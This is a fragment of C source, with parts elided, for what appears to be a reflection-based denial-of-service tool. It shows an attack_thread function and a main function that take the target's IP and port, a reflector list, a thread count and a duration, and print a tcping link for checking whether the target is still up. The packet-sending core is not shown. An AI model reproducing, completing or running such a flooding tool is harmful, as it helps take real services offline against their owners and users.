...
void *attack_thread(void *arg) {
    const char *src_ip = ((char **)arg)[0];
    int src_port = atoi(((char **)arg)[1]);
...
int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <src_ip> <src_port> <reflector_file> <threads> <seconds>\n", argv[0]);
        return 1;
    }

    printf("https://www.itdog.cn/tcping/%s:%s\n",argv[1],argv[2]);

    const char *src_ip = argv[1];
    const char *src_port_str = argv[2];
    ...
    void *args[2] = {(void *)src_ip, (void *)src_port_str};
